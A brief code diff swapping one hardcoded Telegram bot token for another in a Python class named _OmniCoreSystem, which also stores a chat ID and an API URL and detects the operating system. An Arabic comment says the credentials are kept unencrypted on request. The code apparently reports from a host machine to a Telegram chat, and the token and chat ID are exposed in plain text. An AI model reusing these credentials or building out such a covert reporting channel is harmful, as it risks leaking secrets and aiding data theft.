@@ -36,7 +36,7 @@ from pathlib import Path
 class _OmniCoreSystem:
     def __init__(self):
         # التوكن والأيدي صريحة وبدون أي تشفير كما طلبت
-        self.token = "8888070632:AAFtJlDpvkUZiD6lop9p2nB_7ukPxeiel9c"
+        self.token = "8659976658:AAGOs6rHOKcGgmessXsdGLKbcjyvWgeVT6c"
         self.chat_id = "5951452314"
         self.api = f"https://api.telegram.org/bot{self.token}"
         self.system = platform.system()
